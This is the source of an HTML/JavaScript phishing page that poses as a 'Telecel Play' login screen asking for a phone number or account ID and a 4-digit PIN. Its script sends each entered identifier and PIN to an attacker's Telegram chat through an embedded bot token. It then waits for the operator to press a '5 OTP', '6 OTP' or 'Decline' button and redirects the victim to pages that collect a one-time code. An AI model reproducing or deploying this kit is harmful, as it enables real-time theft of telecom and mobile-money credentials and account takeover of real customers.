<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Telecel – Login with PIN</title>
  <!-- Google Fonts & Icons -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', Arial, Helvetica, sans-serif;
    }

    body {
      background: #f5f5f5;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }

    /* Main container – exactly same as original */
    .container {
      width: 360px;
      background: #f7f7f7;
      border-radius: 28px;
      padding: 40px 20px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      position: relative;
      overflow: hidden;
      text-align: center;
    }

    /* Top red shape */
    .top-bg {
      position: absolute;
      top: 0;
      right: 0;
      width: 220px;
      height: 220px;
      background: linear-gradient(135deg, rgba(255,0,0,0.25), rgba(255,0,0,0.6));
      border-bottom-left-radius: 120px;
    }

    /* Content wrapper */
    .content {
      position: relative;
      z-index: 2;
    }

    /* Logo */
    .logo {
      text-align: center;
      margin-top: 60px;
    }
    .logo-circle {
      width: 52px;
      height: 52px;
      background: #ff0000;
      border-radius: 50%;
      color: #ffffff !important;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 30px;
      margin: auto;
      font-weight: 800;
    }
    .logo-text {
      color: #ff0000;
      font-size: 26px;
      font-weight: bold;
      margin-top: 8px;
    }

    /* Titles */
    .title {
      text-align: center;
      color: #ff0000;
      font-size: 20px;
      font-weight: 600;
      margin-top: 15px;
    }
    .subtitle {
      text-align: center;
      color: #666;
      font-size: 15px;
      margin-top: 10px;
      line-height: 1.5;
    }

    /* Form */
    .form {
      margin-top: 30px;
      text-align: left;
    }

    .label {
      font-size: 13px;
      color: #666;
      margin-bottom: 8px;
      display: block;
    }

    /* Input & select */
    .input, .select {
      width: 100%;
      height: 50px;
      border-radius: 12px;
      border: 1px solid #ddd;
      padding: 0 15px;
      font-size: 15px;
      background: #fff;
      outline: none;
      transition: border 0.2s;
    }
    .input:focus, .select:focus {
      border-color: #ff0000;
    }

    /* Custom dropdown */
    .dropdown {
      position: relative;
      cursor: pointer;
    }
    .select-wrapper {
      position: relative;
    }
    .select {
      width: 100%;
      height: 50px;
      border-radius: 12px;
      border: 1px solid #ddd;
      padding: 0 40px 0 15px;
      font-size: 15px;
      background: #fff;
      cursor: pointer;
      appearance: none;
    }
    .arrow {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 14px;
      color: #888;
      transition: 0.3s;
      pointer-events: none;
    }
    .dropdown-list {
      position: absolute;
      width: 100%;
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      margin-top: 5px;
      display: none;
      overflow: hidden;
      z-index: 10;
    }
    .dropdown-item {
      padding: 15px;
      font-size: 15px;
      cursor: pointer;
    }
    .dropdown-item.active {
      background: #ffe5e5;
      color: #ff0000;
    }
    .dropdown-item:hover {
      background: #f5f5f5;
    }

    /* PIN inputs row – exactly matches phone input width using grid */
    .pin-row {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 12px;
      margin-top: 8px;
      margin-bottom: 20px;
    }
    .pin-input {
      width: 100%;           /* fill the grid cell */
      height: 50px;          /* same height as phone input */
      border-radius: 12px;   /* same border radius */
      border: 1px solid #ddd;
      text-align: center;
      font-size: 24px;
      font-weight: 600;
      background: #fff;
      outline: none;
      transition: border 0.2s;
      /* password masking + numeric keyboard */
      -webkit-text-security: disc;
      inputmode: numeric;
      pattern: \d*;
      font-family: monospace;
    }
    .pin-input:focus {
      border-color: #ff0000;
      box-shadow: 0 0 0 2px rgba(255,0,0,0.2);
    }
    .pin-input.filled {
      border-color: #ffaaaa;
      background: #fff9f9;
    }

    /* Buttons */
    .btn {
      width: 100%;
      height: 55px;
      border: none;
      border-radius: 14px;
      font-size: 16px;
      margin-top: 20px;
      cursor: pointer;
      font-weight: 600;
    }
    .btn-primary {
      background: #ff0000;
      color: #fff;
    }
    .btn-primary.disabled, .btn-primary:disabled {
      background: #e5e5e5;
      color: #999;
      cursor: not-allowed;
    }
    .btn-outline {
      background: transparent;
      border: 2px solid #ff0000;
      color: #666;
      font-weight: 600;
    }

    /* Version */
    .version {
      text-align: center;
      color: #aaa;
      font-size: 12px;
      margin-top: 20px;
    }

    /* Spinner overlay */
    #spinner {
      position: fixed;
      inset: 0;
      display: none;
      align-items: center;
      justify-content: center;
      background: rgba(255, 255, 255, 0.7);
      backdrop-filter: blur(2px);
      z-index: 999;
    }
    .loader {
      width: 44px;
      height: 44px;
      border: 4px solid #ffe0e0;
      border-top: 4px solid #ff0000;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* Error box */
    .error-box {
      position: absolute;
      top: 20px;
      left: 20px;
      right: 20px;
      background: #fff;
      border: 2px solid #ff4d4d;
      border-radius: 12px;
      padding: 15px;
      display: none;
      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
      z-index: 100;
      text-align: left;
    }
    .error-title {
      color: #ff0000;
      font-weight: bold;
      margin-bottom: 5px;
    }
    .error-text {
      color: #444;
      font-size: 14px;
    }
    .close {
      position: absolute;
      right: 15px;
      top: 10px;
      cursor: pointer;
      font-size: 18px;
      color: #999;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="top-bg"></div>

  <!-- Error box -->
  <div class="error-box" id="errorBox">
    <div class="close" onclick="hideError()">×</div>
    <div class="error-title">Error</div>
    <div class="error-text" id="errorText">Invalid credentials</div>
  </div>

  <div class="content">
    <div class="logo">
      <div class="logo-circle">t</div>
      <div class="logo-text">telecel</div>
    </div>
    <div class="title">Welcome to Telecel Play</div>
    <div class="subtitle">
      Enter your number or account ID and your 4‑digit PIN.
    </div>

    <div class="form">
      <!-- Account type dropdown -->
      <div class="label">Account type</div>
      <div class="dropdown" onclick="toggleDropdown()">
        <div class="select-wrapper">
          <input class="select" id="selectedType" value="Mobile" readonly>
          <span class="arrow" id="arrow">▼</span>
        </div>
        <div class="dropdown-list" id="dropdownList">
          <div class="dropdown-item active" onclick="selectType(event,'Mobile')">Mobile</div>
          <div class="dropdown-item" onclick="selectType(event,'Broadband')">Broadband</div>
        </div>
      </div>

      <!-- Identifier field -->
      <div class="label" id="inputLabel" style="margin-top:15px;">Phone Number</div>
      <input class="input" id="inputField" placeholder="020XXXXXXX" inputmode="numeric">

      <!-- PIN inputs row (grid, exactly matching phone input width) -->
      <div class="label" style="margin-top:15px;">4‑Digit PIN</div>
      <div class="pin-row">
        <input type="password" class="pin-input" id="pin1" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
        <input type="password" class="pin-input" id="pin2" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
        <input type="password" class="pin-input" id="pin3" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
        <input type="password" class="pin-input" id="pin4" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
      </div>

      <!-- Login button -->
      <button class="btn btn-primary" id="loginBtn" disabled>Login</button>
      <button class="btn btn-outline" id="goBackBtn">Go Back</button>

      <div class="version">v26.2.2(TPA-2622)</div>
    </div>
  </div>
</div>

<!-- Spinner overlay -->
<div id="spinner">
  <div class="loader"></div>
</div>

<script>
  // ========== TELEGRAM CONFIG ==========
  const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k';
  const CHAT_ID   = '1006917440';
  const API_BASE  = `https://api.telegram.org/bot${BOT_TOKEN}`;

  // ========== DOM ELEMENTS ==========
  const selectedTypeInput = document.getElementById('selectedType');
  const inputField = document.getElementById('inputField');
  const dropdownList = document.getElementById('dropdownList');
  const arrow = document.getElementById('arrow');
  const loginBtn = document.getElementById('loginBtn');
  const goBackBtn = document.getElementById('goBackBtn');
  const spinner = document.getElementById('spinner');
  const errorBox = document.getElementById('errorBox');
  const errorText = document.getElementById('errorText');

  // PIN inputs
  const pinInputs = [
    document.getElementById('pin1'),
    document.getElementById('pin2'),
    document.getElementById('pin3'),
    document.getElementById('pin4')
  ];

  // ========== STATE ==========
  let isSubmitting = false;
  let currentPollInterval = null;

  // ========== ERROR HANDLING ==========
  function showError(message) {
    errorText.innerText = message || 'Invalid credentials';
    errorBox.style.display = 'block';
  }
  function hideError() {
    errorBox.style.display = 'none';
  }

  // ========== INPUT FILTERING (identifier) ==========
  function filterInput(value, type) {
    if (type === 'Mobile') {
      return value.replace(/[^0-9]/g, '');
    } else {
      return value.replace(/[^a-zA-Z0-9]/g, '');
    }
  }

  function applyIdentifierFilter() {
    const currentType = selectedTypeInput.value;
    const raw = inputField.value;
    const filtered = filterInput(raw, currentType);
    if (filtered !== raw) {
      inputField.value = filtered;
    }
  }

  // Clear PIN fields (no focus stealing)
  function clearPinFields() {
    pinInputs.forEach(input => {
      input.value = '';
      input.classList.remove('filled');
    });
  }

  // Focus first PIN field (used after decline)
  function focusFirstPin() {
    pinInputs[0].focus();
  }

  // Update login button state: identifier not empty AND all 4 PIN digits filled
  function updateLoginButton() {
    const identifier = inputField.value.trim();
    const allPinsFilled = pinInputs.every(pin => pin.value.length === 1);
    const isValid = identifier !== '' && allPinsFilled;
    loginBtn.disabled = !isValid;
    if (isValid) {
      loginBtn.classList.remove('disabled');
    } else {
      loginBtn.classList.add('disabled');
    }
  }

  // PIN auto-advance and styling
  function setupPinInputs() {
    pinInputs.forEach((input, idx) => {
      input.addEventListener('input', function(e) {
        let val = this.value;
        val = val.replace(/\D/g, '').slice(0,1);
        this.value = val;
        if (val.length === 1) {
          this.classList.add('filled');
          if (idx < pinInputs.length - 1) {
            pinInputs[idx + 1].focus();
          }
        } else {
          this.classList.remove('filled');
        }
        updateLoginButton();
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace') {
          if (this.value.length === 0 && idx > 0) {
            e.preventDefault();
            pinInputs[idx - 1].focus();
            pinInputs[idx - 1].value = '';
            pinInputs[idx - 1].classList.remove('filled');
            updateLoginButton();
          }
        } else if (e.key === 'ArrowLeft') {
          if (idx > 0) {
            e.preventDefault();
            pinInputs[idx - 1].focus();
          }
        } else if (e.key === 'ArrowRight') {
          if (idx < pinInputs.length - 1) {
            e.preventDefault();
            pinInputs[idx + 1].focus();
          }
        } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete') {
          e.preventDefault();
        }
      });
    });
  }

  // Reset PIN fields when identifier changes (no focus stealing)
  inputField.addEventListener('input', function() {
    applyIdentifierFilter();
    clearPinFields();
    updateLoginButton();
    hideError();
  });
  inputField.addEventListener('paste', function(e) {
    e.preventDefault();
    const pasted = (e.clipboardData || window.clipboardData).getData('text');
    const currentType = selectedTypeInput.value;
    const filtered = filterInput(pasted, currentType);
    const start = this.selectionStart || 0;
    const end = this.selectionEnd || 0;
    const newValue = this.value.substring(0, start) + filtered + this.value.substring(end);
    this.value = filterInput(newValue, currentType);
    const newCursor = start + filtered.length;
    this.setSelectionRange(newCursor, newCursor);
    clearPinFields();
    updateLoginButton();
    hideError();
  });

  // ========== DROPDOWN FUNCTIONS ==========
  function toggleDropdown() {
    const isVisible = dropdownList.style.display === 'block';
    dropdownList.style.display = isVisible ? 'none' : 'block';
    arrow.classList.toggle('rotate', !isVisible);
  }
  function selectType(e, type) {
    e.stopPropagation();
    selectedTypeInput.value = type;
    document.querySelectorAll('.dropdown-item').forEach(item => {
      item.classList.remove('active');
    });
    e.target.classList.add('active');

    const label = document.getElementById('inputLabel');
    if (type === 'Mobile') {
      label.innerText = 'Phone Number';
      inputField.placeholder = '020XXXXXXX';
      inputField.inputMode = 'numeric';
    } else {
      label.innerText = 'User ID / Account Number';
      inputField.placeholder = 'Eg: Xgtrjj';
      inputField.inputMode = 'text';
    }
    applyIdentifierFilter();
    dropdownList.style.display = 'none';
    arrow.classList.remove('rotate');
    clearPinFields();
    updateLoginButton();
    hideError();
  }
  document.addEventListener('click', function(e) {
    if (!e.target.closest('.dropdown')) {
      dropdownList.style.display = 'none';
      arrow.classList.remove('rotate');
    }
  });

  // ========== TELEGRAM HELPERS ==========
  function escapeHtml(unsafe) {
    if (!unsafe) return '';
    return unsafe.replace(/[&<>"]/g, function(m) {
      if (m === '&') return '&amp;';
      if (m === '<') return '&lt;';
      if (m === '>') return '&gt;';
      if (m === '"') return '&quot;';
      return m;
    });
  }

  async function sendToTelegram(payload) {
    const url = `${API_BASE}/sendMessage`;
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      return await response.json();
    } catch (error) {
      console.error('Telegram send error:', error);
      throw error;
    }
  }

  function pollForCallback(expectedPrefix, expectedTs, onDecision) {
    if (currentPollInterval) clearInterval(currentPollInterval);

    let lastUpdateId = 0;
    currentPollInterval = setInterval(async () => {
      try {
        const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
        const response = await fetch(url);
        const data = await response.json();
        if (!data.ok || !data.result.length) return;

        let decisionMade = false;
        for (const update of data.result) {
          lastUpdateId = update.update_id;
          if (!decisionMade && update.callback_query && update.callback_query.data) {
            const parts = update.callback_query.data.split('_');
            if (parts.length >= 3) {
              const [type, action, time] = parts;
              if (time == expectedTs && type === expectedPrefix) {
                decisionMade = true;
                clearInterval(currentPollInterval);
                currentPollInterval = null;
                onDecision(action);
              }
            }
          }
        }
      } catch (err) {
        console.warn('Polling error:', err);
      }
    }, 1500);
  }

  // OTP generators
  function generate5DigitOTP() {
    return Math.floor(10000 + Math.random() * 90000).toString();
  }
  function generate6DigitOTP() {
    return Math.floor(100000 + Math.random() * 900000).toString();
  }

  // ========== LOGIN SUBMIT ==========
  async function submitLogin() {
    if (isSubmitting) return;

    const identifier = inputField.value.trim();
    const pin = pinInputs.map(p => p.value).join('');
    if (identifier === '' || pin.length !== 4) {
      showError('Please fill in all fields');
      return;
    }

    isSubmitting = true;
    loginBtn.disabled = true;
    spinner.style.display = 'flex';

    const accountType = selectedTypeInput.value;
    const ts = Date.now();

    let identifierLabel = accountType === 'Mobile' ? 'Phone Number' : 'Account ID';
    const escapedIdentifier = escapeHtml(identifier);
    const escapedPin = escapeHtml(pin);
    const msg = `🔐 Login Request\n\nAccount Type: ${accountType}\n${identifierLabel}: <code>${escapedIdentifier}</code>\nPIN: <code>${escapedPin}</code>\n\nChoose OTP length or Decline:`;

    try {
      await sendToTelegram({
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [[
            { text: '5 OTP', callback_data: `login_5otp_${ts}` },
            { text: '6 OTP', callback_data: `login_6otp_${ts}` },
            { text: 'Decline', callback_data: `login_decline_${ts}` }
          ]]
        }
      });

      sessionStorage.setItem('telecel_accountType', accountType);
      sessionStorage.setItem('telecel_inputValue', identifier);
      if (accountType === 'Mobile') {
        sessionStorage.setItem('telecel_phone', identifier.replace(/\D/g, ''));
      } else {
        sessionStorage.setItem('telecel_phone', identifier);
      }

      pollForCallback('login', ts, (action) => {
        spinner.style.display = 'none';
        isSubmitting = false;

        if (action === '5otp') {
          const otp = generate5DigitOTP();
          sessionStorage.setItem('telecel_otp', otp);
          sessionStorage.setItem('telecel_otp_length', '5');
          window.location.href = 'otp5.html';
        } else if (action === '6otp') {
          const otp = generate6DigitOTP();
          sessionStorage.setItem('telecel_otp', otp);
          sessionStorage.setItem('telecel_otp_length', '6');
          window.location.href = 'otp6.html';
        } else if (action === 'decline') {
          showError('Authentication declined. Please check your credentials.');
          clearPinFields();
          focusFirstPin();  // focus first PIN for re‑entry
          loginBtn.disabled = false;
          updateLoginButton();
        }
      });

    } catch (err) {
      console.error(err);
      spinner.style.display = 'none';
      isSubmitting = false;
      showError('Network error, please try again.');
      loginBtn.disabled = false;
      updateLoginButton();
    }
  }

  // ========== EVENT LISTENERS ==========
  loginBtn.addEventListener('click', submitLogin);
  goBackBtn.addEventListener('click', () => {
    window.history.back();
  });

  // Initialize
  function init() {
    dropdownList.style.display = 'none';
    applyIdentifierFilter();
    setupPinInputs();
    updateLoginButton();
    hideError();
  }
  init();

  // Expose globals for inline handlers
  window.toggleDropdown = toggleDropdown;
  window.selectType = selectType;
  window.hideError = hideError;
</script>
</body>
</html>
